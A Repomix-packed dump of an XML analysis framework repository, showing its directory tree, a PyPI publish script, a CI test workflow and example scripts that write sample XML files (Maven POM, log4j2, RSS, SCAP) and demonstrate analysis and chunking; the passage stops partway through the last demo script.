This file is a merged representation of the entire codebase, combined into a single document by Repomix.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
.github/
  workflows/
    tests.yml
examples/
  basic_analysis.py
  enhanced_analysis.py
  framework_demo.py
  quick_test.py
  README.md
  xml-demo-script.py
sample_data/
  test_files/
    medium/
      scap/
        xccdf_1.2_bundle_1_xccdf_1.2.xsd
      xsd/
        xccdf_1.2.xsd
    small/
      ant/
        ant-antlibs-common-build.xml
        ant-ivy-build.xml
        apache-ant-build.xml
        maven-resolver-ant-build.xml
      dita/
        tei-correspondence-intro.xml
      gpx/
        sample-track.gpx
      hl7/
        ccda-care-plan.xml
        ccda-ccd-sample.xml
        ccda-problems-external-ref.xml
        hl7-ccd-sample.xml
      kml/
        mapbox-example.kml
      nuget/
        example-nuspec.xml
      pmml/
        ibm-watson-iris-chaid.xml
      scap/
        ios-sample-1.0.xccdf.xml
        ios-sample-1.1.xccdf.xml
        ios-sample-v1.1.3.xccdf.xml
        xccdf_1.2_bundle_2_xml.xsd
        xccdf_1.2_bundle_3_cpe-language_2.3.xsd
      tei/
        tei-addresses.xml
        tei-pre-printed-parts.xml
        tei-simple-spec.xml
      wadl/
        sample-wadl.xml
      wsdl/
        bet365-contacts-soap.wsdl
        calculator-soap.wsdl
        mulesoft-tshirt-soap.wsdl
        sample-1.1-soap.wsdl
      xbrl/
        watson-iris-pmml.xml
      xslfo/
        projectteam-to-fo.xsl
      xslt/
        legal-codes-transform.xsl
    download_stats.json
  test_files_synthetic/
    small/
      ant/
        build.xml
      dita/
        cloud-security-overview.dita
        enterprise-security-guide.ditamap
      docbook/
        article.xml
        book.xml
        chapter.xml
        sample-docbook-guide.xml
      gpx/
        cycling_route.gpx
        hiking_track.gpx
        mount-tamalpais-hike.gpx
        running_activity.gpx
        simple_waypoints.gpx
      graphml/
        dependency_graph.graphml
        neural_network.graphml
        simple_network.graphml
      hibernate/
        hibernate.cfg.xml
        Order.hbm.xml
        Product.hbm.xml
        User.hbm.xml
      hl7cda/
        continuity-of-care-document.xml
      ivy/
        ivy.xml
        ivysettings.xml
        library-ivy.xml
      kml/
        area_polygon.kml
        complex_document.kml
        route_linestring.kml
        san-francisco-tour.kml
        simple_placemark.kml
      log4j/
        log4j.xml
        log4j2-example.xml
        log4j2-vulnerable.xml
        log4j2.xml
      nuget/
        SampleLibrary.DataAccess.nuspec
      pmml/
        credit-risk-model.xml
      pom/
        spring-boot-example-pom.xml
      relaxng/
        recipe-collection.rng
      rss/
        sample-feed.xml
      saml/
        saml_assertion.xml
        saml_authn_request.xml
        saml_logout_request.xml
        saml_response.xml
      scap/
        security-assessment-report.xml
      sitemap/
        minimal.xml
        sitemap-example.xml
        sitemapindex.xml
        urlset.xml
      soap/
        soap_fault.xml
        soap_request.xml
        soap_response.xml
        soap12_envelope.xml
      spring/
        applicationContext-example.xml
      struts/
        enterprise_struts_config.xml
        legacy_struts_config.xml
        simple_struts_config.xml
      svg/
        animation.svg
        chart.svg
        icon.svg
        logo.svg
        sample-icon.svg
      tei/
        clemens-howells-letter-1876.xml
      wadl/
        complex_api.wadl
        ecommerce-api.wadl
        simple_api.wadl
      wsdl/
        hotel-reservation-service.wsdl
      xbrl/
        financial-report-2024.xml
      xhtml/
        basic_webpage.xhtml
        form_page.xhtml
        semantic_article.xhtml
        simple_page.xhtml
      xliff/
        multilingual_project.xlf
        simple_translation.xlf
        software_ui_translation.xlf
      xsd/
        library-schema.xsd
    COLLECTION_SUMMARY.md
  xml-test-files-guide.md
src/
  core/
    __init__.py
    analyzer.py
    chunking.py
    schema_analyzer.py
  handlers/
    __init__.py
    ant_build_handler.py
    bpmn_handler.py
    docbook_handler.py
    enterprise_config_handler.py
    generic_xml_handler.py
    gpx_handler.py
    graphml_handler.py
    hibernate_handler.py
    ivy_handler.py
    kml_handler.py
    log4j_config_handler.py
    maven_pom_handler.py
    openapi_xml_handler.py
    properties_xml_handler.py
    rss_handler.py
    saml_handler.py
    scap_handler.py
    servicenow_handler.py
    sitemap_handler.py
    soap_envelope_handler.py
    spring_config_handler.py
    struts_config_handler.py
    svg_handler.py
    test_report_handler.py
    wadl_handler.py
    wsdl_handler.py
    xhtml_handler.py
    xliff_handler.py
    xsd_handler.py
  utils/
    __init__.py
  __init__.py
  base.py
tests/
  comprehensive/
    __init__.py
    test_all_sample_data.py
    test_gpx_comprehensive.py
    test_kml_manual.py
    test_xhtml_comprehensive.py
  debug/
    debug_analyzer_issue.py
    debug_hierarchical_chunking.py
  integration/
    __init__.py
    test_ant_integration.py
    test_docbook_integration.py
    test_gpx_integration.py
    test_graphml_integration.py
    test_kml_integration.py
    test_sitemap_integration.py
    test_struts_integration.py
    test_svg_integration.py
    test_wadl_integration.py
    test_xhtml_integration.py
    test_xliff_integration.py
  unit/
    __init__.py
    test_ant_handler.py
    test_docbook_handler.py
    test_gpx_handler.py
    test_graphml_handler.py
    test_hibernate_handler.py
    test_ivy_handler.py
    test_kml_handler.py
    test_log4j_handler.py
    test_saml_handler.py
    test_servicenow_handler.py
    test_sitemap_handler.py
    test_soap_handler.py
    test_struts_handler.py
    test_svg_handler.py
    test_wadl_handler.py
    test_xhtml_handler.py
    test_xliff_handler.py
  __init__.py
  README.md
  run_all_tests.py
  save_scap_chunks.py
  test_existing_handlers.py
  test_framework.py
  test_migration_progress.py
  test_setup.py
  view_chunk_content.py
AI_INTEGRATION_ARCHITECTURE.md
CHANGELOG.md
CONTRIBUTING.md
LICENSE
MANIFEST.in
publish_pypi.sh
pyproject.toml
README.md
REPOSITORY_UPDATE_SUMMARY.md
requirements.txt
setup.py
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path="publish_pypi.sh">
#! /bin/bash

# This script is used to publish the xml-analysis-framework to PyPI.
python -m build
python -m twine upload dist/*
</file>

<file path=".github/workflows/tests.yml">
name: Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.7, 3.8, 3.9, '3.10', '3.11']

    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -e .
        pip install -e .[dev]
    
    - name: Run unit tests
      run: |
        cd tests
        python -m pytest unit/ -v
    
    - name: Run integration tests
      run: |
        cd tests
        python -m pytest integration/ -v
    
    - name: Run comprehensive tests
      run: |
        cd tests
        python -m pytest comprehensive/ -v
    
    - name: Run all tests with master runner
      run: |
        cd tests
        python run_all_tests.py

  lint:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install flake8 black mypy
    
    - name: Lint with flake8
      run: |
        flake8 src/ --count --select=E9,F63,F7,F82 --show-source --statistics
        flake8 src/ --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
    
    - name: Check formatting with black
      run: |
        black --check src/
    
    - name: Type check with mypy
      run: |
        mypy src/ --ignore-missing-imports
</file>

<file path="examples/framework_demo.py">
#!/usr/bin/env python3
"""
XML Analysis Framework Demonstration

This script demonstrates the full capabilities of the XML analysis framework,
including specialized handlers, chunking strategies, and AI use case identification.
"""

import sys
import json
from pathlib import Path
from typing import Dict, Any

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from src.core.analyzer import XMLSchemaAnalyzer, XMLDocumentAnalyzer
from src.core.chunking import ChunkingOrchestrator, ChunkingConfig

def print_separator(title: str = ""):
    """Print a nice separator line"""
    if title:
        print(f"\n{'='*20} {title} {'='*20}")
    else:
        print("="*60)

def demonstrate_specialized_handlers():
    """Demonstrate the specialized handler system"""
    print_separator("SPECIALIZED HANDLER DEMONSTRATION")
    
    # Example XML files to test
    test_files = [
        {
            "path": "sample_data/pom.xml",
            "content": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>demo-app</artifactId>
    <version>1.0.0</version>
    <packaging>jar</packaging>
    
    <properties>
        <java.version>11</java.version>
        <spring.version>5.3.10</spring.version>
    </properties>
    
    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.13.2</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
</project>"""
        },
        {
            "path": "sample_data/log4j2.xml",
            "content": """<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" monitorInterval="30">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
        <RollingFile name="RollingFile" fileName="logs/app.log"
                     filePattern="logs/app-%d{MM-dd-yyyy}-%i.log.gz">
            <PatternLayout pattern="%d{ISO8601} [%t] %-5level %logger{36} - %msg%n"/>
            <Policies>
                <TimeBasedTriggeringPolicy/>
                <SizeBasedTriggeringPolicy size="10MB"/>
            </Policies>
        </RollingFile>
    </Appenders>
    <Loggers>
        <Logger name="com.example" level="DEBUG" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFile"/>
        </Logger>
        <Root level="INFO">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>"""
        },
        {
            "path": "sample_data/rss_feed.xml",
            "content": """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
    <channel>
        <title>Tech News Daily</title>
        <link>https://example.com/news</link>
        <description>Latest technology news and updates</description>
        <item>
            <title>AI Breakthrough in Natural Language Processing</title>
            <description>Researchers announce significant improvements in LLM capabilities</description>
            <link>https://example.com/news/ai-breakthrough</link>
            <pubDate>Mon, 23 Jul 2025 10:00:00 GMT</pubDate>
            <category>AI</category>
        </item>
        <item>
            <title>New Security Vulnerability Discovered</title>
            <description>Critical vulnerability affects millions of devices worldwide</description>
            <link>https://example.com/news/security-alert</link>
            <pubDate>Sun, 22 Jul 2025 15:30:00 GMT</pubDate>
            <category>Security</category>
        </item>
    </channel>
</rss>"""
        }
    ]
    
    # Create sample files
    sample_dir = Path("sample_data")
    sample_dir.mkdir(exist_ok=True)
    
    for test_file in test_files:
        file_path = Path(test_file["path"])
        file_path.parent.mkdir(exist_ok=True)
        file_path.write_text(test_file["content"])
    
    # Analyze each file
    analyzer = XMLDocumentAnalyzer()
    
    for test_file in test_files:
        print(f"\n📄 Analyzing: {test_file['path']}")
        print("-" * 40)
        
        result = analyzer.analyze_document(test_file["path"])
        
        if "error" in result:
            print(f"❌ Error: {result['error']}")
            continue
        
        doc_type = result["document_type"]
        analysis = result["analysis"]
        
        print(f"✅ Document Type: {doc_type.type_name}")
        print(f"   Confidence: {doc_type.confidence:.1%}")
        print(f"   Handler: {result['handler_used']}")
        
        if analysis:
            print(f"\n🔍 Key Findings:")
            for key, value in list(analysis.key_findings.items())[:3]:
                print(f"   - {key}: {value}")
            
            print(f"\n🤖 AI Use Cases:")
            for use_case in analysis.ai_use_cases[:3]:
                print(f"   - {use_case}")
            
            print(f"\n📊 Data Quality:")
            for metric, score in analysis.quality_metrics.items():
                print(f"   - {metric}: {score:.1%}")

def demonstrate_chunking_strategies():
    """Demonstrate different chunking strategies"""
    print_separator("CHUNKING STRATEGY DEMONSTRATION")
    
    # Create a larger sample XML for chunking
    large_xml_path = Path("sample_data/large_document.xml")
    large_xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<documentation>
    <metadata>
        <title>System Administration Guide</title>
        <version>2.0</version>
        <date>2025-07-23</date>
    </metadata>
    <chapters>
        <chapter id="intro">
            <title>Introduction</title>
            <section>
                <title>Overview</title>
                <para>This guide provides comprehensive information about system administration tasks.</para>
                <para>It covers installation, configuration, maintenance, and troubleshooting.</para>
            </section>
            <section>
                <title>Prerequisites</title>
                <para>Before beginning, ensure you have the following:</para>
                <list>
                    <item>Administrative access to the system</item>
                    <item>Basic understanding of command line interfaces</item>
                    <item>Network connectivity for updates</item>
                </list>
            </section>
        </chapter>
        <chapter id="installation">
            <title>Installation</title>
            <section>
                <title>System Requirements</title>
                <para>The following are minimum system requirements:</para>
                <table>
                    <row><cell>CPU</cell><cell>2 cores @ 2.0 GHz</cell></row>
                    <row><cell>RAM</cell><cell>4 GB minimum, 8 GB recommended</cell></row>
                    <row><cell>Storage</cell><cell>20 GB available space</cell></row>
                </table>
            </section>
            <section>
                <title>Installation Steps</title>
                <para>Follow these steps to install the system:</para>
                <code language="bash">
# Download the installer
wget https://example.com/installer.sh

# Make it executable
chmod +x installer.sh

# Run the installer
sudo ./installer.sh
                </code>
            </section>
        </chapter>
        <chapter id="configuration">
            <title>Configuration</title>
            <section>
                <title>Basic Configuration</title>
                <para>After installation, configure the basic settings.</para>
                <para>Edit the main configuration file located at /etc/system/config.xml</para>
            </section>
            <section>
                <title>Advanced Options</title>
                <para>For advanced users, additional options are available.</para>
                <para>These include performance tuning, security hardening, and custom modules.</para>
            </section>
        </chapter>
    </chapters>
</documentation>"""
    
    large_xml_path.write_text(large_xml_content)
    
    # Analyze the document first
    analyzer = XMLDocumentAnalyzer()
    analysis_result = analyzer.analyze_document(str(large_xml_path))
    
    # Test different chunking strategies
    orchestrator = ChunkingOrchestrator()
    
    strategies = ['hierarchical', 'sliding_window', 'content_aware']
    
    for strategy in strategies:
        print(f"\n📦 Testing {strategy.upper()} chunking strategy")
        print("-" * 40)
        
        # Custom config for demonstration
        config = ChunkingConfig(
            max_chunk_size=500,  # Smaller chunks for demo
            min_chunk_size=100,
            overlap_size=50,
            preserve_hierarchy=True
        )
        
        chunks = orchestrator.chunk_document(
            str(large_xml_path),
            analysis_result,
            strategy=strategy,
            config=config
        )
        
        print(f"✂️  Created {len(chunks)} chunks")
        
        # Show first 2 chunks
        for i, chunk in enumerate(chunks[:2]):
            print(f"\n   Chunk {i+1}:")
            print(f"   - ID: {chunk.chunk_id}")
            print(f"   - Path: {chunk.element_path}")
            print(f"   - Tokens: ~{chunk.token_estimate}")
            print(f"   - Elements: {', '.join(chunk.elements_included[:3])}")
            print(f"   - Preview: {chunk.content[:80]}...")

def demonstrate_ai_use_cases():
    """Show how the analysis can be used for AI projects"""
    print_separator("AI USE CASE DEMONSTRATION")
    
    # Create a sample SCAP document
    scap_path = Path("sample_data/security_scan.xml")
    scap_content = """<?xml version="1.0" encoding="UTF-8"?>
<arf:asset-report-collection xmlns:arf="http://scap.nist.gov/schema/asset-reporting-format/1.1">
    <core:relationships xmlns:core="http://scap.nist.gov/schema/reporting-core/1.1">
        <core:relationship type="isAbout" subject="scan1">
            <core:ref>server-01</core:ref>
        </core:relationship>
    </core:relationships>
    <arf:reports>
        <arf:report id="scan1">
            <content>
                <rule-result idref="xccdf_rule_1" severity="high">
                    <result>fail</result>
                    <message>SSH root login is enabled</message>
                </rule-result>
                <rule-result idref="xccdf_rule_2" severity="medium">
                    <result>pass</result>
                    <message>Firewall is properly configured</message>
                </rule-result>
                <rule-result idref="xccdf_rule_3" severity="high">
                    <result>fail</result>
                    <message>System updates are not configured</message>
                </rule-result>
            </content>
        </arf:report>
    </arf:reports>
</arf:asset-report-collection>"""
    
    scap_path.write_text(scap_content)
    
    # Analyze the document
    analyzer = XMLDocumentAnalyzer()
    result = analyzer.analyze_document(str(scap_path))
    
    print("\n🎯 AI Project Planning Assistant")
    print("-" * 40)
    
    if result.get("analysis"):
        analysis = result["analysis"]
        doc_type = result["document_type"].type_name
        
        print(f"\n📄 Document Type: {doc_type}")
        print(f"\n🤖 Recommended AI Applications:")
        
        for i, use_case in enumerate(analysis.ai_use_cases, 1):
            print(f"\n{i}. {use_case}")
            
            # Provide specific guidance for each use case
            if "compliance" in use_case.lower():
                print("   📋 Implementation approach:")
                print("   - Extract rule violations and patterns")
                print("   - Train classifier on historical compliance data")
                print("   - Build automated remediation suggestions")
                
            elif "risk" in use_case.lower():
                print("   📋 Implementation approach:")
                print("   - Aggregate severity scores and failure patterns")
                print("   - Develop risk scoring model")
                print("   - Create predictive analytics dashboard")
                
            elif "recommendation" in use_case.lower():
                print("   📋 Implementation approach:")
                print("   - Map failures to remediation steps")
                print("   - Use NLP to generate human-readable fixes")
                print("   - Prioritize based on risk and effort")
        
        print(f"\n📊 Data Availability:")
        for data_type, count in analysis.data_inventory.items():
            print(f"   - {data_type}: {count}")
        
        print(f"\n✨ Quick Start Code:")
        print("""
# Load and process the analyzed data
from pathlib import Path
import json

# Load the analysis results
with open('security_scan_enhanced_analysis.json') as f:
    analysis = json.load(f)

# Extract structured data for ML
structured_data = analysis['specialized_analysis']['analysis']['structured_data']

# Example: Build a compliance classifier
failed_rules = [rule for rule in structured_data.get('scan_results', []) 
                if rule.get('result') == 'fail']

# Train your model on the extracted data
# model.train(failed_rules, remediation_labels)
""")

def demonstrate_integration_workflow():
    """Show a complete workflow from analysis to LLM preparation"""
    print_separator("COMPLETE INTEGRATION WORKFLOW")
    
    print("\n🔄 Workflow: XML → Analysis → Chunks → LLM-Ready")
    print("-" * 40)
    
    # Use the existing STIG file
    stig_path = Path("sample_data/node2.example.com-STIG-20250710162433.xml")
    
    if not stig_path.exists():
        print("❌ STIG sample file not found. Using a smaller example.")
        # Create a simple example
        stig_path = Path("sample_data/mini_stig.xml")
        stig_path.write_text("""<?xml version="1.0"?>
<Benchmark id="xccdf_benchmark">
    <Group id="V-1234">
        <title>Security Configuration</title>
        <Rule id="rule_1234" severity="high">
            <title>Ensure secure settings</title>
            <description>This rule checks for secure configurations</description>
            <check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
                <check-content-ref href="#oval:check:1234"/>
            </check>
        </Rule>
    </Group>
</Benchmark>""")
    
    print(f"\n1️⃣ Step 1: Analyze Document")
    analyzer = XMLDocumentAnalyzer()
    analysis = analyzer.analyze_document(str(stig_path))
    
    print(f"   ✅ Document type: {analysis['document_type'].type_name}")
    print(f"   ✅ Handler confidence: {analysis['confidence']:.1%}")
    
    print(f"\n2️⃣ Step 2: Apply Intelligent Chunking")
    orchestrator = ChunkingOrchestrator()
    chunks = orchestrator.chunk_document(
        str(stig_path),
        analysis,
        strategy='auto'
    )
    
    print(f"   ✅ Created {len(chunks)} chunks")
    print(f"   ✅ Strategy selected: {orchestrator._select_strategy(analysis)}")
    
    print(f"\n3️⃣ Step 3: Prepare for LLM Processing")
    
    # Simulate LLM prompts for first chunk
    if chunks:
        chunk = chunks[0]
        prompt = f"""You are analyzing a {analysis['document_type'].type_name} document.

Document Context:
- Type: {analysis['document_type'].type_name}
- Total chunks: {len(chunks)}
- Current chunk: 1 of {len(chunks)}

Chunk Content:
{chunk.content[:500]}...

Based on this security compliance data, please:
1. Identify any high-severity findings
2. Suggest remediation steps
3. Assess overall security posture
"""
        
        print("   📝 Generated LLM Prompt Preview:")
        print("   " + "-" * 35)
        for line in prompt.split('\n')[:10]:
            print(f"   {line}")
        print("   ...")
    
    print(f"\n4️⃣ Step 4: Process Results")
    print("   ✅ Ready for LLM processing")
    print("   ✅ Chunks maintain context")
    print("   ✅ Specialized extraction completed")

def main():
    """Run all demonstrations"""
    print("\n🚀 XML ANALYSIS FRAMEWORK DEMONSTRATION")
    print("=====================================")
    
    # Create sample directory
    Path("sample_data").mkdir(exist_ok=True)
    
    try:
        # Run demonstrations
        demonstrate_specialized_handlers()
        demonstrate_chunking_strategies()
        demonstrate_ai_use_cases()
        demonstrate_integration_workflow()
        
        print_separator("DEMONSTRATION COMPLETE")
        print("\n✅ All demonstrations completed successfully!")
        print("\n📚 Next Steps:")
        print("1. Try with your own XML files: python analyze_enhanced.py your_file.xml")
        print("2. Create custom handlers for your specific XML formats")
        print("3. Integrate with your LLM pipeline for automated processing")
        print("4. Build AI applications using the extracted structured data")
        
    except Exception as e:
        print(f"\n❌ Error during demonstration: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
</file>

<file path="examples/quick_test.py">
#!/usr/bin/env python3
"""
Quick test of the fixed XML analyzer
"""

import sys
from pathlib import Path

# Add src directory to path
sys.path.append(str(Path(__file__).parent / "src"))

try:
    from src.core.analyzer import XMLSchemaAnalyzer
    
    print("✅ Fixed analyzer imported successfully")
    
    # Test with a small XML sample
    test_xml = """<?xml version="1.0" encoding="UTF-8"?>
<test xmlns:ns="http://example.com">
    <item id="1">
        <name>Test Item</name>
        <value>123</value>
    </item>
    <item id="2">
        <name>Another Item</name>
        <value>456</value>
    </item>
</test>"""
    
    # Write test file
    test_file = "test_sample.xml"
    with open(test_file, 'w') as f:
        f.write(test_xml)
    
    # Test analysis
    analyzer = XMLSchemaAnalyzer()
    schema = analyzer.analyze_file(test_file)
    
    print(f"✅ Test analysis successful!")
    print(f"   Root element: {schema.root_element}")
    print(f"   Total elements: {schema.total_elements}")
    print(f"   Unique elements: {len(schema.elements)}")
    
    # Generate description
    description = analyzer.generate_llm_description(schema)
    print(f"✅ Description generated: {len(description)} characters")
    
    # Cleanup
    Path(test_file).unlink()
    
    print("\n🎉 Fixed analyzer is working correctly!")
    print("Ready to test with large files.")
    
except Exception as e:
    print(f"❌ Test failed: {e}")
    import traceback
    traceback.print_exc()
</file>

<file path="examples/README.md">
# Examples

This directory contains example usage scripts for the XML Analysis Framework.

## Available Examples

### Basic Analysis
- **basic_analysis.py** - Simple XML document analysis using core engine
- **enhanced_analysis.py** - Full analysis with specialized handlers and chunking
- **framework_demo.py** - Comprehensive demonstration of all framework features
- **quick_test.py** - Quick validation and testing script

### Demo Scripts
- **xml-demo-script.py** - Interactive demonstration script
- **xml_framework_demo_script.py** - Framework capabilities showcase

## Usage

```bash
# Basic analysis
python examples/basic_analysis.py sample_data/test_files/small/ant/build.xml

# Enhanced analysis with all handlers
python examples/enhanced_analysis.py sample_data/test_files/small/scap/security-report.xml

# Framework demonstration
python examples/framework_demo.py

# Quick test
python examples/quick_test.py
```

## Requirements

All examples use only Python standard library (3.7+) with no external dependencies.
</file>

<file path="examples/xml-demo-script.py">
#!/usr/bin/env python3
"""
XML Analysis Framework Demonstration

This script demonstrates the full capabilities of the XML analysis framework,
including specialized handlers, chunking strategies, and AI use case identification.
"""

import sys
import json
from pathlib import Path
from typing import Dict, Any

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from src.core.analyzer import XMLDocumentAnalyzer, XMLSchemaAnalyzer
from src.core.chunking import ChunkingOrchestrator, ChunkingConfig

def print_separator(title: str = ""):
    """Print a nice separator line"""
    if title:
        print(f"\n{'='*20} {title} {'='*20}")
    else:
        print("="*60)

def demonstrate_specialized_handlers():
    """Demonstrate the specialized handler system"""
    print_separator("SPECIALIZED HANDLER DEMONSTRATION")
    
    # Example XML files to test
    test_files = [
        {
            "path": "sample_data/pom.xml",
            "content": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>demo-app</artifactId>
    <version>1.0.0</version>
    <packaging>jar</packaging>
    
    <properties>
        <java.version>11</java.version>
        <spring.version>5.3.10</spring.version>
    </properties>
    
    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.13.2</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
</project>"""
        },
        {
            "path": "sample_data/log4j2.xml",
            "content": """<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" monitorInterval="30">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
        <RollingFile name="RollingFile" fileName="logs/app.log"
                     filePattern="logs/app-%d{MM-dd-yyyy}-%i.log.gz">
            <PatternLayout pattern="%d{ISO8601} [%t] %-5level %logger{36} - %msg%n"/>
            <Policies>
                <TimeBasedTriggeringPolicy/>
                <SizeBasedTriggeringPolicy size="10MB"/>
            </Policies>
        </RollingFile>
    </Appenders>
    <Loggers>
        <Logger name="com.example" level="DEBUG" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFile"/>
        </Logger>
        <Root level="INFO">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>"""
        },
        {
            "path": "sample_data/rss_feed.xml",
            "content": """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
    <channel>
        <title>Tech News Daily</title>
        <link>https://example.com/news</link>
        <description>Latest technology news and updates</description>
        <item>
            <title>AI Breakthrough in Natural Language Processing</title>
            <description>Researchers announce significant improvements in LLM capabilities</description>
            <link>https://example.com/news/ai-breakthrough</link>
            <pubDate>Mon, 23 Jul 2025 10:00:00 GMT</pubDate>
            <category>AI</category>
        </item>
        <item>
            <title>New Security Vulnerability Discovered</title>
            <description>Critical vulnerability affects millions of devices worldwide</description>
            <link>https://example.com/news/security-alert</link>
            <pubDate>Sun, 22 Jul 2025 15:30:00 GMT</pubDate>
            <category>Security</category>
        </item>
    </channel>
</rss>"""
        }
    ]
    
    # Create sample files
    sample_dir = Path("sample_data")
    sample_dir.mkdir(exist_ok=True)
    
    for test_file in test_files:
        file_path = Path(test_file["path"])
        file_path.parent.mkdir(exist_ok=True)
        file_path.write_text(test_file["content"])
    
    # Analyze each file
    analyzer = XMLDocumentAnalyzer()
    
    for test_file in test_files:
        print(f"\n📄 Analyzing: {test_file['path']}")
        print("-" * 40)
        
        result = analyzer.analyze_document(test_file["path"])
        
        if "error" in result:
            print(f"❌ Error: {result['error']}")
            continue
        
        doc_type = result["document_type"]
        analysis = result["analysis"]
        
        print(f"✅ Document Type: {doc_type.type_name}")
        print(f"   Confidence: {doc_type.confidence:.1%}")
        print(f"   Handler: {result['handler_used']}")
        
        if analysis:
            print(f"\n🔍 Key Findings:")
            for key, value in list(analysis.key_findings.items())[:3]:
                print(f"   - {key}: {value}")
            
            print(f"\n🤖 AI Use Cases:")
            for use_case in analysis.ai_use_cases[:3]:
                print(f"   - {use_case}")
            
            print(f"\n📊 Data Quality:")
            for metric, score in analysis.quality_metrics.items():
                print(f"   - {metric}: {score:.1%}")

def demonstrate_chunking_strategies():
    """Demonstrate different chunking strategies"""
    print_separator("CHUNKING STRATEGY DEMONSTRATION")
    
    # Create a larger sample XML for chunking
    large_xml_path = Path("sample_data/large_document.xml")
    large_xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<documentation>
    <metadata>
        <title>System Administration Guide</title>
        <version>2.0</version>
        <date>2025-07-23</date>
    </metadata>
    <chapters>
        <chapter id="intro">
            <title>Introduction</title>
            <section>
                <title>Overview</title>
                <para>This guide provides comprehensive information about system administration tasks.</para>
                <para>It covers installation, configuration, maintenance, and troubleshooting.</para>
            </section>
            <section>
                <title>Prerequisites</title>
                <para>Before beginning, ensure you have the following:</para>
                <list>
                    <item>Administrative access to the system</item>
                    <item>Basic understanding of command line interfaces</item>
                    <item>Network connectivity for updates</item>
                </list>
            </section>
        </chapter>
        <chapter id="installation">
            <title>Installation</title>
            <section>
                <title>System Requirements</title>
                <para>The following are minimum system requirements:</para>
                <table>
                    <row><cell>CPU</cell><cell>2 cores @ 2.0 GHz</cell></row>
                    <row><cell>RAM</cell><cell>4 GB minimum, 8 GB recommended</cell></row>
                    <row><cell>Storage</cell><cell>20 GB available space</cell></row>
                </table>
            </section>
            <section>
                <title>Installation Steps</title>
                <para>Follow these steps to install the system:</para>
                <code language="bash">
# Download the installer
wget https://example.com/installer.sh

# Make it executable
chmod +x installer.sh

# Run the installer
sudo ./installer.sh
                </code>
            </section>
        </chapter>
        <chapter id="configuration">
            <title>Configuration</title>
            <section>
                <title>Basic Configuration</title>
                <para>After installation, configure the basic settings.</para>
                <para>Edit the main configuration file located at /etc/system/config.xml</para>
            </section>
            <section>
                <title>Advanced Options</title>
                <para>For advanced users, additional options are available.</para>
                <para>These include performance tuning, security hardening, and custom modules.</para>
            </section>
        </chapter>
    </chapters>
</documentation>"""
    
    large_xml_path.write_text(large_xml_content)
    
    # Analyze the document first
    analyzer = XMLDocumentAnalyzer()
    analysis_result = analyzer.analyze_document(str(large_xml_path))
    
    # Test different chunking strategies
    orchestrator = ChunkingOrchestrator()
    
    strategies = ['hierarchical', 'sliding_window', 'content_aware']
    
    for strategy in strategies:
        print(f"\n📦 Testing {strategy.upper()} chunking strategy")
        print("-" * 40)
        
        # Custom config for demonstration
        config = ChunkingConfig(
            max_chunk_size=500,  # Smaller chunks for demo
            min_chunk_size=100,
            overlap_size=50,
            preserve_hierarchy=True
        )
        
